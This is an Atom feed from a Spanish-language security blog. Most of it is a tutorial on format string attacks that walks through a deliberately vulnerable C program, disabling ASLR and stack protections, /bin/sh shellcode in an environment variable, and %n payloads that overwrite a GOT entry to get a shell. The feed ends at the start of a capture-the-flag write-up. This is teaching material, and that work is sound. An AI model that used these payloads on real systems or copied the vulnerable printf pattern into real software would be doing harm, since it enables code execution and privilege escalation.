<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Security Signal]]></title>
  <link href="http://securitysignal.github.io/atom.xml" rel="self"/>
  <link href="http://securitysignal.github.io/"/>
  <updated>2016-08-04T02:13:38-03:00</updated>
  <id>http://securitysignal.github.io/</id>
  <author>
    <name><![CDATA[q3rv0 - hdbreaker]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[Format String Atack]]></title>
    <link href="http://securitysignal.github.io/blog/2016/03/08/format-string-atack/"/>
    <updated>2016-03-08T17:58:00-08:00</updated>
    <id>http://securitysignal.github.io/blog/2016/03/08/format-string-atack</id>
    <content type="html"><![CDATA[<div class="separator" style="clear: both; text-align: center;"><a href="https://2.bp.blogspot.com/-0eWf79c9C98/VtnROONBjAI/AAAAAAAAA48/SAbGK4oggMU/s1600/s.jpg" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="400" src="https://2.bp.blogspot.com/-0eWf79c9C98/VtnROONBjAI/AAAAAAAAA48/SAbGK4oggMU/s400/s.jpg" width="400" /></a></div><div style="text-align: right;"><b>by hdbreaker</b></div><br />Esta entrada esta dedicada a la lista de entradas sobre <b>Exploiting</b>, pero de momento dejaremos de <br />lado los tratados <b>Buffer Overflow</b> para hablar sobre <br /><a name='more'></a><b></b><br /><h2 style="text-align: center;"><b><b>Format String Atack</b><b>&nbsp;</b></b></h2><b></b><br />Veremos como en el mejor de los casos un <b>Format String Atack </b>puede derivar en &nbsp;la ejecución de código arbitrario.<br /><br />Antes de comenzar, a que nos referimos con&nbsp;<b>Format String</b>?<br /><br />En C/C++ exiten una serie de funciones que nos permiten imprimir en pantalla texto formateado especificado según una serie de <b>parámetros de formato</b><br /><b><br /></b>Estas son las funciones especificadas por <b>owasp</b>:<br /><br /><table align="center" border="1" cellpadding="20" cellspacing="0"><tbody><tr><th>Format function </th><th>Description </th></tr><tr><td>fprint </td><td>Writes the printf to a file </td></tr><tr><td>printf </td><td>Output a formatted string </td></tr><tr><td>sprintf </td><td>Prints into a string </td></tr><tr><td>snprintf </td><td>Prints into a string checking the length </td></tr><tr><td>vfprintf </td><td>Prints the a va_arg structure to a file </td></tr><tr><td>vprintf </td><td>Prints the va_arg structure to stdout </td></tr><tr><td>vsprintf </td><td>Prints the va_arg to a string </td></tr><tr><td>vsnprintf </td><td>Prints the va_arg to a string checking the length </td></tr></tbody></table><br />Estas funciones pueden utilizar la siguiente lista de <b>parámetros de formato:</b><br /><br /><table align="center" border="1" cellpadding="20" cellspacing="0"><tbody><tr><th>Parameters </th><th>Output </th><th>Passed as </th></tr><tr><td>%% </td><td>% character (literal) </td><td>Reference </td></tr><tr><td>%p </td><td>External representation of a pointer to void </td><td>Reference </td></tr><tr><td>%d </td><td>Decimal </td><td>Value </td></tr><tr><td>%c </td><td>Character </td><td></td></tr><tr><td>%u </td><td>Unsigned decimal </td><td>Value </td></tr><tr><td>%x </td><td>Hexadecimal </td><td>Value </td></tr><tr><td>%s </td><td>String </td><td>Reference </td></tr><tr><td>%n </td><td>Writes the number of characters into a pointer </td><td>Reference </td></tr></tbody></table><br />Un ejemplo del uso correcto de estas funciones es:<br /><br />C Code:<br /><br /><pre class="brush: c">printf("Color %s, numero %d, hex %x\n", "rojo", 12345, 255);<br /><br /></pre><br />Output:<br /><br /><div class="separator" style="clear: both; text-align: left;"><a href="https://3.bp.blogspot.com/-1R4EsgOoT_A/VtnXZ3gDxLI/AAAAAAAAA5M/jFVVrWf7zqg/s1600/Captura%2Bde%2Bpantalla%2Bde%2B2016-03-04%2B15%253A43%253A25.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="50" src="https://3.bp.blogspot.com/-1R4EsgOoT_A/VtnXZ3gDxLI/AAAAAAAAA5M/jFVVrWf7zqg/s640/Captura%2Bde%2Bpantalla%2Bde%2B2016-03-04%2B15%253A43%253A25.png" width="640" /></a></div><br /><br />Como vemos la función muestra los valores <b>"rojo", 12345, 255 </b>respetando el formato correspondiente a la orden de aparición de los parámetros de formato.<br /><br />De esta forma <b>%s</b> imprime el string <b>"rojo"</b>, <b>%d</b> imprime el valor decimal de <b>12345</b>, y <b>%x</b> imprime el valor hexadecimal de <b>255</b><br /><div><br /></div><h2 style="text-align: center;"><b>La vulnerabilidad</b></h2><div>De aquí en adelante usaremos el siguiente código vulnerable:<br /><br />Código C:</div><div><br /></div><pre class="brush: c">//vuln.c<br />#include  &lt;stdio.h&gt;<br />#include  &lt;string.h&gt;<br />#include  &lt;stdlib.h&gt;<br /><br />int main (int argc, char **argv)<br />{<br />        char b[100];<br />        strcpy(b, argv[1]);<br />        printf (b);<br />        printf ("\n");<br />        return 0 ;<br />}<br /></pre><div><br /></div><div>Desactivamos el ASLR:</div><div><b>#&nbsp;echo 0 &gt; /proc/sys/kernel/randomize_va_space</b></div><div><b><br /></b></div><div>Compilamos eliminando protecciones:</div><div><b>$ gcc -m32 -fno-stack-protector -z execstack vuln.c -o vuln</b></div><div><br /></div><div>Si analizamos el código vemos que existe un <b>Buffer Overflow </b>en la funcion <b>strcpy(b, argv[1]); </b>donde se copia todo lo ingresado como parámetro de consola (&nbsp;<b>argv[1]&nbsp;</b>) en el buffer &nbsp;<b>b</b> con tamaño determinado en <b>char b[100];</b></div><div><b><br /></b></div><div>Sin embargo no explotaremos el <b>Buffer Overflow,</b>&nbsp;sino que nos centraremos en la función <b>printf (b);</b></div><div><b><br /></b></div><div>En la misma radica la vulnerabilidad de <b>Format String Atack.</b></div><div><br /></div><div>La misma se produce cuando se utiliza alguna función de formato que imprime <b>datos ingresados por el usuario (<span style="color: red;">argv[1]</span>)</b> sin especificar parámetros de formateo.</div><div><br /></div><div>Por lo cual, un atacante podría ingresar como datos parámetros de formateo modificando el funcionamiento de la función <b>printf() </b>a gusto.<b>&nbsp;</b>&nbsp;</div><div><br /></div>En la practica existen 3 parámetros que nos permitirán explotar un Format String Atack:<br /><br /><div style="background-color: white; color: #252525; font-family: sans-serif; font-size: 14px; line-height: 22.3999996185303px; margin-bottom: 0.5em; margin-top: 0.5em;">•"%x" Nos permitirá leer registros del stack</div><div style="background-color: white; color: #252525; font-family: sans-serif; font-size: 14px; line-height: 22.3999996185303px; margin-bottom: 0.5em; margin-top: 0.5em;">•"%s" Nos permitirá leer strings desde la memoria del proceso</div><div style="background-color: white; color: #252525; font-family: sans-serif; font-size: 14px; line-height: 22.3999996185303px; margin-bottom: 0.5em; margin-top: 0.5em;">•"%n" Nos permitirá escribir enteros a un puntero especifico de memoria</div><h2 style="text-align: center;">Information Leakage</h2>El ataque comienza con la posibilidad de recuperar información del Stack y de la Memoria del Proceso utilizando los operadores de lectura %x y %s<br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="https://4.bp.blogspot.com/-m1gItg5r-Uc/VtnfkMEhhLI/AAAAAAAAA5c/svJg_sMmaxM/s1600/Captura%2Bde%2Bpantalla%2Bde%2B2016-03-04%2B16%253A18%253A16.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="40" src="https://4.bp.blogspot.com/-m1gItg5r-Uc/VtnfkMEhhLI/AAAAAAAAA5c/svJg_sMmaxM/s640/Captura%2Bde%2Bpantalla%2Bde%2B2016-03-04%2B16%253A18%253A16.png" width="640" /></a></div><br />Como vemos el programa funciona correctamente e imprime los datos que le enviamos, pero al ser vulnerable, podemos inyectar parámetros de formateo y ver como responde el programa:<br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="https://3.bp.blogspot.com/-nNUHDIWzFSg/VtnggHW4qkI/AAAAAAAAA5k/Hx4zFZI6yZ0/s1600/Captura%2Bde%2Bpantalla%2Bde%2B2016-03-04%2B16%253A22%253A09.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="42" src="https://3.bp.blogspot.com/-nNUHDIWzFSg/VtnggHW4qkI/AAAAAAAAA5k/Hx4zFZI6yZ0/s640/Captura%2Bde%2Bpantalla%2Bde%2B2016-03-04%2B16%253A22%253A09.png" width="640" /></a></div><br />Como vemos los parámetros de formateo se inyectaron correctamente y comenzamos a retornar contenido del stack en las posiciones siguientes del stack, para verlo mas claro, lo analizaremos desde gdb:<br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="https://4.bp.blogspot.com/-iCSyqeMmyLI/VtnhWkfPTnI/AAAAAAAAA5w/lwlJME-OWfI/s1600/Captura%2Bde%2Bpantalla%2Bde%2B2016-03-04%2B16%253A25%253A39.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="424" src="https://4.bp.blogspot.com/-iCSyqeMmyLI/VtnhWkfPTnI/AAAAAAAAA5w/lwlJME-OWfI/s640/Captura%2Bde%2Bpantalla%2Bde%2B2016-03-04%2B16%253A25%253A39.png" width="640" /></a></div><br />Si vemos la sección Stack se puede ver que la posición&nbsp;<b>02:0008,&nbsp;02:0012,&nbsp;02:0016 </b>contienen los valores: <b>0xffffd1b1 , 0x2c0003f y 0x0</b><br /><br />que son exactamente los mismos que nos devuelve nuestra inyección: <br /><div><br /></div><div class="separator" style="clear: both; text-align: center;"><a href="https://3.bp.blogspot.com/-WeoVdhGIzj4/VtniOJ9CCqI/AAAAAAAAA54/YeGsJfqK0a4/s1600/Captura%2Bde%2Bpantalla%2Bde%2B2016-03-04%2B16%253A29%253A29.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="56" src="https://3.bp.blogspot.com/-WeoVdhGIzj4/VtniOJ9CCqI/AAAAAAAAA54/YeGsJfqK0a4/s640/Captura%2Bde%2Bpantalla%2Bde%2B2016-03-04%2B16%253A29%253A29.png" width="640" /></a></div><div><br /></div><div></div>Esto significa que el parámetro %x devuelve el contenido de las direcciones de memoria posteriores al llamado de la función <b>printf(b)</b> y de esta forma podemos acceder al contenido del Stack.<br /><br />También podemos acceder a un lugar especifico del Stack determinando cuantas posiciones hacia adelante queremos leer, por ejemplo, si quisiéramos retornar el valor&nbsp;<b>0x2c0003f</b>, deberíamos mover 2 posiciones el puntero de lectura, esto se puede hacer de la siguiente forma: <b>%2\$x</b><br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="https://1.bp.blogspot.com/-DBbKjhDsNG8/VtnjgQlshZI/AAAAAAAAA6E/ggwfXtQNyYA/s1600/Captura%2Bde%2Bpantalla%2Bde%2B2016-03-04%2B16%253A35%253A09.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="54" src="https://1.bp.blogspot.com/-DBbKjhDsNG8/VtnjgQlshZI/AAAAAAAAA6E/ggwfXtQNyYA/s640/Captura%2Bde%2Bpantalla%2Bde%2B2016-03-04%2B16%253A35%253A09.png" width="640" /></a></div><br /><b>%2</b> =&gt; indica la cantidad de saltos que vamos a realizar con el puntero de lectura<br /><b>\$x</b> =&gt; indica el parámetro de formateo.<br /><br />Otro ejemplo, leeremos un string de las variables de entorno en la memoria del proceso:<br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="https://4.bp.blogspot.com/-3iVIbi_vJd4/VtnkEAjklKI/AAAAAAAAA6I/mWPX2zqi_VA/s1600/Captura%2Bde%2Bpantalla%2Bde%2B2016-03-04%2B16%253A37%253A36.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="54" src="https://4.bp.blogspot.com/-3iVIbi_vJd4/VtnkEAjklKI/AAAAAAAAA6I/mWPX2zqi_VA/s640/Captura%2Bde%2Bpantalla%2Bde%2B2016-03-04%2B16%253A37%253A36.png" width="640" /></a></div><br />Se observa que moviendo el puntero lo suficiente (%121) e indicando que vamos a leer un string (\$s)<br />podemos obtener información de la memoria del proceso, en este caso información sobre las variables de entorno que se cargan en momento de ejecución:<br /><br /><b>KONSOLE_DBUS_SESSION=/Sessions/2</b><br /><br /><h2 style="text-align: center;">Explotation</h2>Comprendiendo el funcionamiento de un binario, podemos determinar que el valor ingresado por el usuario (<b>AAAA</b>) debe, en algún momento ser cargado en una variable del Stack para luego ser utilizado por diferentes instrucciones del ensamblador.<br /><br />Para explotar un <b>Arbitrary Code Execution</b>&nbsp;debemos determinar la posición del Stack donde se guarda nuestro parametro de entrada.<br /><br />Esto lo lograremos leyendo continuamente posiciones del Stack con el parametro de formato <b>%x.</b><br /><b><br /></b><br /><div class="separator" style="clear: both; text-align: center;"><a href="https://3.bp.blogspot.com/-mQ3LQgpDw8M/VtnmEKY52yI/AAAAAAAAA6Y/Wt5E7VrWtUo/s1600/Captura%2Bde%2Bpantalla%2Bde%2B2016-03-04%2B16%253A45%253A58.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="52" src="https://3.bp.blogspot.com/-mQ3LQgpDw8M/VtnmEKY52yI/AAAAAAAAA6Y/Wt5E7VrWtUo/s640/Captura%2Bde%2Bpantalla%2Bde%2B2016-03-04%2B16%253A45%253A58.png" width="640" /></a></div><b><br /></b>Podemos ver que en la posición 7 del Stack se encuentra guardado el valor <b>41414141 </b>que corresponde a AAAA en <b>hexadecimal</b>.<br /><b><br /></b>La magia sucede cuando utilizamos el parametro de formateo <b>%n </b>que nos permitirá escribir un entero dentro de una posición de memoria determinada. Este entero estará dado por el largo de caracteres que contenga nuestro valor ingresado por el usuario.<br /><br />Realizamos una prueba y vemos que se produce un Segmentation Fault:<br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="https://2.bp.blogspot.com/-KRQZbHonZtU/VtnoGO3CX1I/AAAAAAAAA6k/U9y_g6BXt4E/s1600/Captura%2Bde%2Bpantalla%2Bde%2B2016-03-04%2B16%253A54%253A39.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="48" src="https://2.bp.blogspot.com/-KRQZbHonZtU/VtnoGO3CX1I/AAAAAAAAA6k/U9y_g6BXt4E/s640/Captura%2Bde%2Bpantalla%2Bde%2B2016-03-04%2B16%253A54%253A39.png" width="640" /></a></div><br />para entender por que se produce esto, debuggearemos con gdb:<br /><br /><b>gdb-peda$ r AAAA-%7\$n</b><br /><div><br /></div><div class="separator" style="clear: both; text-align: center;"><a href="https://3.bp.blogspot.com/-K6YOHLCnzvk/VtnodwqrJpI/AAAAAAAAA6o/SlIwsYoC-ms/s1600/Captura%2Bde%2Bpantalla%2Bde%2B2016-03-04%2B16%253A56%253A12.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="106" src="https://3.bp.blogspot.com/-K6YOHLCnzvk/VtnodwqrJpI/AAAAAAAAA6o/SlIwsYoC-ms/s640/Captura%2Bde%2Bpantalla%2Bde%2B2016-03-04%2B16%253A56%253A12.png" width="640" /></a></div><br />Vemos que nuestro puntero se detiene en:<br /><b>mov &nbsp; &nbsp;DWORD PTR [eax],ecx</b><br /><b><br /></b>Lo que implica que el error que produce nuestro segmentation fault se produce aquí.<br /><br />La instrucción MOV intenta mover el contenido de <b>ECX</b> dentro de la dirección de memoria de&nbsp;<b>EAX</b>,<br />pero que contiene ECX y EAX?<br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="https://1.bp.blogspot.com/-iYWLQs2RFsU/VtnpTN1hG0I/AAAAAAAAA6w/Fw78ZIjocGw/s1600/Captura%2Bde%2Bpantalla%2Bde%2B2016-03-04%2B17%253A00%253A01.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="76" src="https://1.bp.blogspot.com/-iYWLQs2RFsU/VtnpTN1hG0I/AAAAAAAAA6w/Fw78ZIjocGw/s640/Captura%2Bde%2Bpantalla%2Bde%2B2016-03-04%2B17%253A00%253A01.png" width="640" /></a></div><br /><b>ECX</b> =&gt; Corresponde al largo del parámetro que enviamos por consola, nosotros enviamos AAAA-<br />lo cual corresponde a 5 caracteres, cuya representación hexadecimal es 0x5.<br /><br /><b>EAX</b> =&gt; Es la dirección de memoria donde se va a guardar ECX, obviamente la dirección de memoria <b>0x41414141</b> no existe, por lo que al intentar copiar ECX dentro de EAX el programa se detiene.<br /><br /><b>Esto nos da información muy importante:</b><br /><br /><span style="color: red;">Por medio de información enviada por el usuario podemos escribir un entero de cualquier largo dentro de una dirección de memoria que inyectamos arbitrariamente en el Stack. </span><br /><br />Esto nos permitirá controlar el flujo de la aplicación reescribiendo la dirección de memoria donde debe saltar una llamada a libc, o dicho de otra forma, hacia donde debe saltar una instrucción Call que llame a una funcion de libc.<br /><br />Desensamblamos MAIN y buscamos una llamada a una funcion de libc posterior a printf:<br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="https://3.bp.blogspot.com/-ABrGB2wu4B4/VtnrVdXo-OI/AAAAAAAAA7A/zLadoUGSGTo/s1600/Captura%2Bde%2Bpantalla%2Bde%2B2016-03-04%2B17%253A08%253A40.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="438" src="https://3.bp.blogspot.com/-ABrGB2wu4B4/VtnrVdXo-OI/AAAAAAAAA7A/zLadoUGSGTo/s640/Captura%2Bde%2Bpantalla%2Bde%2B2016-03-04%2B17%253A08%253A40.png" width="640" /></a></div><br />Vemos que en la dirección&nbsp;<b>0x080484a5 </b>se produce la llamada a <b>printf</b>, y posterior mente en la dirección&nbsp;<b>0x080484b1 </b>se realiza una llamada a la función <b>putchar</b>.<br /><br />Ambas funciones pertenecen a <b>libc</b>, y todas los punteros hacia funciones importadas desde <b>libc</b> se cargan en la tabla:&nbsp;<b>DYNAMIC RELOCATION RECORDS</b><br /><b><br /></b>Obtenemos esta tabla utilizando <b>Objdump:&nbsp;</b><br /><b>$ objdump -R vuln</b><br /><b><br /></b><br /><div class="separator" style="clear: both; text-align: center;"><a href="https://2.bp.blogspot.com/-vQ8z_uZFNQA/VtnscxE6q6I/AAAAAAAAA7I/1PVuwMSEp68/s1600/Captura%2Bde%2Bpantalla%2Bde%2B2016-03-04%2B17%253A13%253A06.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="244" src="https://2.bp.blogspot.com/-vQ8z_uZFNQA/VtnscxE6q6I/AAAAAAAAA7I/1PVuwMSEp68/s640/Captura%2Bde%2Bpantalla%2Bde%2B2016-03-04%2B17%253A13%253A06.png" width="640" /></a></div><b><br /></b><br />En síntesis, al ejecutarse la instrucción CALL hacia <b>putchar</b>, la memoria retorna la dirección correcta hacia donde debe saltar<b>&nbsp;</b>preguntandole a la tabla&nbsp;<b>DYNAMIC RELOCATION RECORDS en que dirección de memoria de libc </b>se encuentra <b>putchar.</b><br />En este caso <b>putchar </b>se encuentra en la dirección de memoria <b>0x0804a01c</b>.<br /><br />Gracias al <b>Format String Atack </b>podremos modificar esta dirección y lograr que&nbsp;<b>DYNAMIC RELOCATION RECORDS </b>le responda a&nbsp;<b>CALL </b>con&nbsp;la dirección de memoria donde alojemos nuestro Shellcode.<br /><br />Para esto crearemos nuestra shellcode dentro de una variable de entorno:<br /><br /><pre class="brush: bash">$ export EGG=$(python -c "print '\x90'*100+'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'")<br /></pre><br /><br />y obtendremos su dirección por medio de <b>Getenv </b>o por medio de <b>gdb:</b><br /><b><br /></b><br /><div class="separator" style="clear: both; text-align: center;"><a href="https://4.bp.blogspot.com/-kkFXEgkuTgI/VtnuO4njehI/AAAAAAAAA7U/fZYyU08mvH8/s1600/Captura%2Bde%2Bpantalla%2Bde%2B2016-03-04%2B17%253A20%253A59.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="42" src="https://4.bp.blogspot.com/-kkFXEgkuTgI/VtnuO4njehI/AAAAAAAAA7U/fZYyU08mvH8/s640/Captura%2Bde%2Bpantalla%2Bde%2B2016-03-04%2B17%253A20%253A59.png" width="640" /></a></div><b><br /></b>Nuestro shellcode se aloja en la dirección de memoria:&nbsp;<b>0xffffd3c8</b><br /><b><br /></b>Por lo cual debemos lograr que&nbsp;<b>DYNAMIC RELOCATION RECORDS </b>responda al <b>Call </b>esa dirección.<br /><br />Para esto utilizaremos el parametro de formateo <b>%n</b> para sobrescribir con enteros la dirección <b>0x0804a01c</b> (<b>DYNAMIC RELOCATION RECORDS de putchar</b>), por la que nosotros deseemos.<br /><br />Como la mayoria de los enteros se pueden representar por el largo de 2 bytes, deberemos dividir la dirección&nbsp;<b>0x0804a01c </b>en 2 direcciones:<br /><br /><b><span style="color: red;">!!!Recordar Little Endian!!!</span></b><br />La primera:&nbsp;<b>0x0804a01c </b>que contemplara los 2 primeros bytes del string:&nbsp;<b>a01c</b><br />La segunda:&nbsp;<b>0x0804a01e </b>que contemplara los 2 ultimos bytes del string&nbsp;<b>0804</b><br /><br />Por lo que nuestro payload quedara de la siguiente forma:<br /><br /><pre class="brush: bash">r $(python -c "import struct; print struct.pack('&lt;I', 0x0804a01c) + struct.pack('&lt;I', 0x0804a01e)")-%7\$n-%8\$n<br /></pre><br /><br /><div class="separator" style="clear: both; text-align: center;"></div><div class="separator" style="clear: both; text-align: center;"><a href="https://3.bp.blogspot.com/-H5U-PsgQUKA/VtnyohLjNUI/AAAAAAAAA7s/--u24gAN56k/s1600/Captura%2Bde%2Bpantalla%2Bde%2B2016-03-04%2B17%253A38%253A28.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="24" src="https://3.bp.blogspot.com/-H5U-PsgQUKA/VtnyohLjNUI/AAAAAAAAA7s/--u24gAN56k/s640/Captura%2Bde%2Bpantalla%2Bde%2B2016-03-04%2B17%253A38%253A28.png" width="640" /></a></div><br />Observamos como EIP ahora salta hacia: <b>0x000a0009</b><br /><br />De ahora en mas todo lo que se encuentre delante de <b>%7\$n </b>modificara la dirección <b>0x0804a01c </b>que corresponde al segmento:&nbsp;<b>0009 </b>y todo lo que se encuentre delante de <b>%8\$n </b>modificara la dirección <b>0x0804a01e </b>que corresponde al segmento:&nbsp;<b>000a</b><br /><b><br /></b><b>Recordemos:</b><br />Nuestro shellcode se aloja en la dirección de memoria:&nbsp;<b>0xffffd3c8</b><br /><b><br /></b>Jugando con el largo del input deberiamos lograr que <b>0009 </b>se convierta en&nbsp;<b>d3c8 </b>y <b>000a </b>se convierta en <b>ffff</b>.<br /><br />Ingresar todos estos caracteres uno a uno hasta llegar al objetivo es algo un tanto engorroso podremos ayudarnos del operador de formato: <b>%<span style="color: red;">{Numer_Decimal}</span>u</b> que incrementara el valor ingresado tal cual si lo hicieramos a mano.<br /><br />Hora de calcular:<br /><br /><b>d3c8 - 0009 =&nbsp;D3BF =&gt;&nbsp;54207 Decimal</b><br /><br />Modificamos nuestro payload:<br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="https://2.bp.blogspot.com/-SecjxXbMFC0/Vtn0zZvFuaI/AAAAAAAAA74/v9VXIWKphZM/s1600/Captura%2Bde%2Bpantalla%2Bde%2B2016-03-04%2B17%253A49%253A05.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="22" src="https://2.bp.blogspot.com/-SecjxXbMFC0/Vtn0zZvFuaI/AAAAAAAAA74/v9VXIWKphZM/s640/Captura%2Bde%2Bpantalla%2Bde%2B2016-03-04%2B17%253A49%253A05.png" width="640" /></a></div><br />Vemos como nuestro <b>0009 </b>ahora es&nbsp;<b>d3c8 </b>que es la cola de nuestra dirección de shellcode:&nbsp;<b>0xffffd3c8</b><br />pero tambien vemos que <b>000a </b>se transformo a&nbsp;<b>d3c9</b>&nbsp;esto se debe al aumento de bytes producto de insertar el largo de&nbsp;<b>54207 </b>caracteres.<br /><br />Calculamos la diferencia faltante para la cabeza de nuestra dirección de memoria:<br /><br /><b>ffff - d3c9 =&nbsp;2C36&nbsp;=&gt;&nbsp;11318&nbsp;Decimal</b><br /><b><br /></b>Corregimos nuestro payload:<br /><br /><pre class="brush: bash">r $(python -c "import struct; print struct.pack('&lt;I', 0x0804a01c) + struct.pack('&lt;I', 0x0804a01e)")-%54207u%7\$n-%11318u%8\$n<br /></pre><br /><br />y obtenemos shell dentro de gdb:<br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="https://3.bp.blogspot.com/-hrUynbi_TeI/Vtn1989lJSI/AAAAAAAAA8A/x9MDGIUu9_0/s1600/Captura%2Bde%2Bpantalla%2Bde%2B2016-03-04%2B17%253A54%253A02.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="80" src="https://3.bp.blogspot.com/-hrUynbi_TeI/Vtn1989lJSI/AAAAAAAAA8A/x9MDGIUu9_0/s640/Captura%2Bde%2Bpantalla%2Bde%2B2016-03-04%2B17%253A54%253A02.png" width="640" /></a></div><br />Solo queda lograr la ejecución fuera de gdb:<br /><br /><pre class="brush: bash">./vuln $(python -c "import struct; print struct.pack('&lt;I', 0x0804a01c) + struct.pack('&lt;I', 0x0804a01e)")-%54207u%7\$n-%11318u%8\$n</pre><pre class="brush: bash"></pre><div class="separator" style="clear: both; text-align: center;"><a href="https://1.bp.blogspot.com/-fzFRPOqsECc/Vt-BZv1cFvI/AAAAAAAAA8U/BVwkdx9TmsA/s1600/Captura%2Bde%2Bpantalla%2Bde%2B2016-03-08%2B22%253A48%253A31.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="32" src="https://1.bp.blogspot.com/-fzFRPOqsECc/Vt-BZv1cFvI/AAAAAAAAA8U/BVwkdx9TmsA/s640/Captura%2Bde%2Bpantalla%2Bde%2B2016-03-08%2B22%253A48%253A31.png" width="640" /></a></div><br />Como verán la dirección cambió un poco, nuestro shellcode comienza en la dirección <b>0xfffd3c2</b><br />sin embargo nuestro exploit funcionara igual aunque estemos redirigiendo el flujo a la dirección&nbsp;<b>0xfffd3c8, </b>ya que esta zona esta contenida por nuestro nopsleed (es decir los primeros 100 <b>nop </b>agregados al inicio de nuestra shellcode: <b>export EGG=$(python -c "print '\x90'*100...</b>)<br /><br />El resultado:<br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="https://4.bp.blogspot.com/-h27ZbNuieYE/Vt-BrZrSIWI/AAAAAAAAA8Y/qInlf0Fn5yA/s1600/Captura%2Bde%2Bpantalla%2Bde%2B2016-03-08%2B22%253A48%253A49.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="144" src="https://4.bp.blogspot.com/-h27ZbNuieYE/Vt-BrZrSIWI/AAAAAAAAA8Y/qInlf0Fn5yA/s640/Captura%2Bde%2Bpantalla%2Bde%2B2016-03-08%2B22%253A48%253A49.png" width="640" /></a></div><br />Si el dueño del binario fuese, y tuviera el Bit Suid activo obtendríamos Shell Root:<br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="https://3.bp.blogspot.com/-bdY85VzxXUE/Vt-CqdaANII/AAAAAAAAA8k/TcRRbf-gWPI/s1600/Captura%2Bde%2Bpantalla%2Bde%2B2016-03-08%2B22%253A55%253A15.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="80" src="https://3.bp.blogspot.com/-bdY85VzxXUE/Vt-CqdaANII/AAAAAAAAA8k/TcRRbf-gWPI/s640/Captura%2Bde%2Bpantalla%2Bde%2B2016-03-08%2B22%253A55%253A15.png" width="640" /></a></div><br />Root:<br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="https://1.bp.blogspot.com/-_jJwA0xwqiU/Vt-C1byzFCI/AAAAAAAAA8o/Os6qzvfLkBw/s1600/Captura%2Bde%2Bpantalla%2Bde%2B2016-03-08%2B22%253A56%253A27.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="172" src="https://1.bp.blogspot.com/-_jJwA0xwqiU/Vt-C1byzFCI/AAAAAAAAA8o/Os6qzvfLkBw/s640/Captura%2Bde%2Bpantalla%2Bde%2B2016-03-08%2B22%253A56%253A27.png" width="640" /></a></div><br />]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Ringzer0 Level4 Pwned! by hdbreaker]]></title>
    <link href="http://securitysignal.github.io/blog/2016/01/07/ringzer0-level4-pwned-by-hdbreaker/"/>
    <updated>2016-01-07T01:21:00-08:00</updated>
    <id>http://securitysignal.github.io/blog/2016/01/07/ringzer0-level4-pwned-by-hdbreaker</id>
    <content type="html"><![CDATA[<div class="separator" style="clear: both; text-align: center;"></div><div class="separator" style="clear: both; text-align: center;"><a href="http://3.bp.blogspot.com/-VO1WNDA77xM/Vo3cxiLR73I/AAAAAAAAA0E/qdAG0KktkWE/s1600/descarga.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="276" src="http://3.bp.blogspot.com/-VO1WNDA77xM/Vo3cxiLR73I/AAAAAAAAA0E/qdAG0KktkWE/s400/descarga.png" width="400" /></a></div><div style="text-align: right;"><b>by hdbreaker</b></div><div style="text-align: right;"><b><br /></b></div><div style="text-align: left;">Hace algunos días me entere que el equipo de&nbsp;<a href="http://www.ringzer0team.com/">ringzer0team</a>&nbsp;había creado nuevos retos de exploiting&nbsp;y decidí retomar el reto que en su momento me dejo trabado.<br /><a name='more'></a><br />Este reto ya había sido solucionado por<b> [Q]3rv[0]</b>&nbsp;y en su momento compartió su solución en:</div><div style="text-align: left;"><br /></div><div style="text-align: left;"><a href="http://www.securitysignal.org/2015/02/level4-pwned.html">http://www.securitysignal.org/2015/02/level4-pwned.html</a></div><div style="text-align: left;"><br /></div><div style="text-align: left;">Este post no trata de ser una repetición de lo mismo, sino un enfoque distinto para resolver el reto.<br /><br />De mas esta decir que voy a ir tratando los distintos problemas que fui encontrando ya que no he había propuesto no leer la solución de&nbsp;<b>[Q]3rv[0] </b>hasta haberlo resuelto por mis propios medios.<br /><br /></div><div class="separator" style="clear: both; text-align: center;"><a 